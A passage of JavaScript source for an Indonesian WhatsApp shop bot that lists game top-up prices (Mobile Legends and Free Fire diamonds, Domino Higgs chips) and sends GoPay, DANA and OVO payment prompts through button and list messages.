 description: `Hai @${sender.split('@')[0]} Have a nice day  😇 berikut list dimaond mobile legend yang saat ini tersedia`,
 footerText: `${tampilTanggal}${enter}${tampilWaktu}`,
 sections: sections7,
 listType: 1
}

alpha.sendMessage(from, listt7, MessageType.listMessage,{quoted:ftoko, contextInfo: { "mentionedJid" : [sender]}})
	}
if(subscribezeeoneofc == 'higs_domino'){
	const rows8 = [ {
				"title": `⦿ 100 M = Rp 8.000 💰`,
				"rowId": "0"
			},
			{
				"title": `⦿ 200 M = Rp 15.000 💰`,
				"rowId": "0"
			},
			{
				"title": `⦿ 300 M = Rp 22.000 💰`,
				"rowId": "0"
			},
			{
				"title": `⦿ 400 M = Rp 30.000 💰`,
				"rowId": "0"
			},
			{
				"title": `⦿ 500 M = Rp 35.000 💰`,
				"rowId": "0"
			},
			{
				"title": `⦿ 700 M = Rp 50.000 💰`,
				"rowId": "0"
			},
			{
				"title": `⦿ 1 B = Rp 65.000 💰`,
				"rowId": "0"
			},
			{
				"title": `⦿ 1.5 B = Rp 100.000 💰`,
				"rowId": "0"
			}

]
		
const sections8 = [{title: "Pilih salah satu", rows: rows8}]
const listt8 = {
 buttonText: 'SELECT HERE',
 title: `LIST DOMINO HIGS`,
 description: `Hai @${sender.split('@')[0]} Have a nice day  😇 berikut list Domino higs yang saat ini tersedia`,
 footerText: `${tampilTanggal}${enter}${tampilWaktu}`,
 sections: sections8,
 listType: 1
}

alpha.sendMessage(from, listt8, MessageType.listMessage,{quoted:ftoko, contextInfo: { "mentionedJid" : [sender]}})
	}
if(subscribezeeoneofc == 'owner'){
members_ids = []
		            for (let mem of groupMembers) {
		            members_ids.push(mem.jid)
		            }
		            vcard2 = 'BEGIN:VCARD\n'
		            + 'VERSION:3.0\n'
		            + `FN:${setting.ownername}\n`
		            + `ORG: SUBSCRIBE YT ZEEONE OFC;\n`
		            + `TEL;type=CELL;type=VOICE;waid=${setting.ownerNumber}:${setting.ownerNumberr}\n`
		            + 'END:VCARD'.trim()
		            alpha.sendMessage(from, {displayName: `${setting.ownername}`, vcard: vcard2}, contact, { quoted: fkontak, contextInfo: {"mentionedJid": members_ids}})
		           .then((res) => alpha.sendMessage(from, 'Tuh kontak ownerku', text, {quoted: mek}))

} 
if(subscribezeeoneofc == 'qr_gopay'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `hay ${pushname}, ini adalah detail pembayaran kamu, bayar sesuai nominal yg kamu pilih,`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: gambar_gopay_nya, quoted: mek, caption: `Jangan lupa mengisi format order berikut setelah melakukan pembayaran\n\n*Nama*  : \n*ID*  : \n*Nick Name* : \n*Nominal* :\n\n*「 ${shop} 」*`})
} 
if(subscribezeeoneofc == 'langsung_gopay'){
optionsp = `*SILAHKAN TUNGGU ADMIN MERESPON DAN LAKUKAN PEMBAYARAN*

•> _Nama : ${pushname}_
•> _Nomor : ${sender.split("@")[0]}_

*_PAYMENT GOPAY_*

Jangan lupa mengisi format order berikut setelah melakukan pembayaran\n\n*ID*  : \n*Nick Name* : \n*Nominal* :
 
${nomor_gopay}

Silahkan ketik ${prefix}proses agar pesanan kamu segera di proses

 _🕐 ${wita} Wita_

*「 ${shop} 」*`
alpha.sendMessage(from, optionsp, text, {quoted: fkontak, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })             
} 
if(subscribezeeoneofc == 'qr_dana'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `hay ${pushname}, ini adalah detail pembayaran kamu, bayar sesuai nominal yg kamu pilih,`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: gambar_dana_nya, quoted: mek, caption: `Jangan lupa mengisi format order berikut setelah melakukan pembayaran\n\n*Nama*  : \n*ID*  : \n*Nick Name* : \n*Nominal* :\n\n*「 ${shop} 」*`})
} 
if(subscribezeeoneofc == 'langsung_dana'){
optionsp = `*SILAHKAN TUNGGU ADMIN MERESPON DAN LAKUKAN PEMBAYARAN*


• _Nama : ${pushname}_
• _Nomor : ${sender.split("@")[0]}_

Jangan lupa mengisi format order berikut setelah melakukan pembayaran\n\n*ID*  : \n*Nick Name* : \n*Nominal* :

*_PAYMENT DANA_*

${nomor_dana}

Silahkan ketik ${prefix}proses agar pesanan kamu segera di proses.

_🕐 ${wita} Wita_

*「 ${shop} 」*`
alpha.sendMessage(from, optionsp, text, {quoted: fkontak, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })             
} 
if(subscribezeeoneofc == 'langsung_ovo'){
optionsp = `*SILAHKAN TUNGGU ADMIN MERESPON DAN LAKUKAN PEMBAYARAN*


• _Nama : ${pushname}_
• _Nomor : ${sender.split("@")[0]}_

Jangan lupa mengisi format order berikut setelah melakukan pembayaran\n\n*ID*  : \n*Nick Name* : \n*Nominal* :

*_PAYMENT OVO_*

${nomor_ovo}

Silahkan ketik ${prefix}proses agar pesanan kamu segera di proses.

_🕐 ${wita} Wita_

*「 ${shop} 」*`
alpha.sendMessage(from, optionsp, text, {quoted: fkontak, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })             
} 
if(subscribezeeoneofc == 'qr_ovo'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `hay ${pushname}, ini adalah detail pembayaran kamu, bayar sesuai nominal yg kamu pilih,`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: gambar_ovo_nya, quoted: mek, caption: `Jangan lupa mengisi format order berikut setelah melakukan pembayaran\n\n*Nama*  : \n*ID*  : \n*Nick Name* : \n*Nominal* :\n\n*「 ${shop} 」*`})
} 
/*
  ]-------- GOPAY --------[  
*/
if(subscribezeeoneofc == 'gopay'){
ini_mark = `6288217066706@s.whatsapp.net`
ini_gopay =`hay ${pushname}, ini adalah detail pembayaran kamu, bayar sesuai nominal yg kamu pilih,`
buttons = [
{buttonId: 'qr_gopay', buttonText: {displayText: '📠 Qr Code'}, type: 1},
{buttonId: 'langsung_gopay', buttonText:{displayText: '💸 Gopay'}, type: 1}
]

buttonMessage = {
contentText: `${ini_gopay}`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
/*
  ]-------- OVO --------[  
*/
if(subscribezeeoneofc == 'dana'){
ini_mark = `6288217066706@s.whatsapp.net`
ini_gopay =`hay ${pushname}, ini adalah detail pembayaran kamu, bayar sesuai nominal yg kamu pilih,`
buttons = [
{buttonId: 'qr_dana', buttonText: {displayText: '📠 Qr Code'}, type: 1},
{buttonId: 'langsung_dana', buttonText:{displayText: '💸 Dana'}, type: 1}
]

buttonMessage = {
contentText: `${ini_gopay}`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if(subscribezeeoneofc == 'ovo'){
ini_mark = `6288217066706@s.whatsapp.net`
ini_ovo =`hay ${pushname}, ini adalah detail pembayaran kamu, bayar sesuai nominal yg kamu pilih,`
buttons = [
{buttonId: 'qr_ovo', buttonText: {displayText: '📠 Qr Code'}, type: 1},
{buttonId: 'langsung_ovo', buttonText:{displayText: '💸 Ovo'}, type: 1}
]

buttonMessage = {
contentText: `${ini_ovo}`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
/////
if(subscribezeeoneofc == 'payment'){
buttons = [
{buttonId: 'gopay', buttonText: {displayText: 'GOPAY'}, type: 1},
{buttonId: 'dana', buttonText: {displayText: 'DANA'}, type: 1},
{buttonId: 'ovo', buttonText: {displayText: 'OVO'}, type: 1}

]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\nBerikut adalah metode pembayaran yang tersedia di ${shop}. Untuk metode pembayaran melalui link aja ketik ${prefix}link_aja`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}

 alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
// list message ff
if (sub_yt_zeeone_ofc == `${_diamond16}`) {
buttons = [
{buttonId: 'diamond_ff', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ${_diamond16} dgn harga ${diamond16}\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}

 alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
}
if (sub_yt_zeeone_ofc == `${_diamond17}`) {
buttons = [
{buttonId: 'diamond_ff', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ${_diamond17} dgn harga ${diamond17}\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}

 alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `${_diamond1}`) {
buttons = [
{buttonId: 'diamond_ff', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ${_diamond1} dgn harga ${diamond1}\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}

 alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc ==`${_diamond2}`) {
buttons = [
{buttonId: 'diamond_ff', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ${_diamond2} dgn harga ${diamond2}\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `${_diamond3}`) {
buttons = [
{buttonId: 'diamond_ff', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ${_diamond3} dgn harga ${diamond3} \n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `${_diamond4}`) {
buttons = [
{buttonId: 'diamond_ff', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ${_diamond4} dgn harga ${diamond4}\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `${_diamond5}`) {
buttons = [
{buttonId: 'diamond_ff', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ${_diamond5} dgn harga ${diamond5}\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `${_diamond6}`) {
buttons = [
{buttonId: 'diamond_ff', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ${_diamond6} dgn harga ${diamond6}\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `${_diamond7}`) {
buttons = [
{buttonId: 'diamond_ff', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ${_diamond7} dgn harga ${diamond7}\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `${_diamond8}`) {
buttons = [
{buttonId: 'diamond_ff', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ${_diamond8} dgn harga ${diamond8}\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `${_diamond9}`) {
buttons = [
{buttonId: 'diamond_ff', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ${_diamond9} dgn harga ${diamond9}\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `${_diamond10}`) {
buttons = [
{buttonId: 'diamond_ff', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ${_diamond10} dgn harga ${diamond10}\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `${_diamond11}`) {
buttons = [
{buttonId: 'diamond_ff', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ${_diamond11} dgn harga ${diamond11}\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc ==`${_diamond12}`) {
buttons = [
{buttonId: 'diamond_ff', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ${_diamond12} dgn harga ${diamond12}\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `${_diamond13}`) {
buttons = [
{buttonId: 'diamond_ff', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ${_diamond13} dgn harga ${diamond13} \n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `${_diamond14}`) {
buttons = [
{buttonId: 'diamond_ff', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ${_diamond14} dgn harga ${diamond14}\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `${_diamond15}`) {
buttons = [
{buttonId: 'diamond_ff', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ${_diamond15} dgn harga ${diamond15}\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 

// list message ml
if (sub_yt_zeeone_ofc == `⦿ 86 💎 = Rp 22.000 💰`) {
buttons = [
{buttonId: 'diamond_ml', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ⦿ 86 💎 = Rp 22.000 💰\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}

 alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `⦿ 172 💎 = Rp 42.000 💰`) {
buttons = [
{buttonId: 'diamond_ml', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ⦿ 172 💎 = Rp 42.000 💰\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}

 alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc ==`⦿ 257 💎 = Rp 62.000 💰`) {
buttons = [
{buttonId: 'diamond_ml', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ⦿ 257 💎 = Rp 62.000 💰\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `⦿ 706 💎 = Rp 162.000 💰`) {
buttons = [
{buttonId: 'diamond_ml', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ⦿ 706 💎 = Rp 162.000 💰 \n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `⦿ 2195 💎 = Rp 480.000 💰`) {
buttons = [
{buttonId: 'diamond_ml', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ⦿ 2195 💎 = Rp 480.000 💰\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `⦿ 3688 💎 = Rp 780.000 💰`) {
buttons = [
{buttonId: 'diamond_ml', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ⦿ 3688 💎 = Rp 780.000 💰\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `⦿ 5532 💎 = Rp 1.200.000 💰`) {
buttons = [
{buttonId: 'diamond_ml', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ⦿ 5532 💎 = Rp 1.200.000 💰\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `⦿ 9288 💎 = Rp 1.995.000 💰`) {
buttons = [
{buttonId: 'diamond_ml', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ⦿ 9288 💎 = Rp 1.995.000 💰\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 

// list message ml
if (sub_yt_zeeone_ofc == `⦿ 100 M = Rp 8.000 💰`) {
buttons = [
{buttonId: 'higs_domino', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ⦿ 100 M = Rp 8.000 💰\n• Pilih back jika ingin kembali ke list domino higs`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}

 alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `⦿ 200 M = Rp 15.000 💰`) {
buttons = [
{buttonId: 'higs_domino', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ⦿ 200 M = Rp 15.000 💰\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}

 alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc ==`⦿ 300 M = Rp 22.000 💰`) {
buttons = [
{buttonId: 'higs_domino', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ⦿ 300 M = Rp 22.000 💰\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `⦿ 400 M = Rp 30.000 💰`) {
buttons = [
{buttonId: 'higs_domino', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ⦿ 400 M = Rp 30.000 💰 \n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `⦿ 500 M = Rp 35.000 💰`) {
buttons = [
{buttonId: 'higs_domino', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ⦿ 500 M = Rp 35.000 💰\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `⦿ 700 M = Rp 50.000 💰`) {
buttons = [
{buttonId: 'higs_domino', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
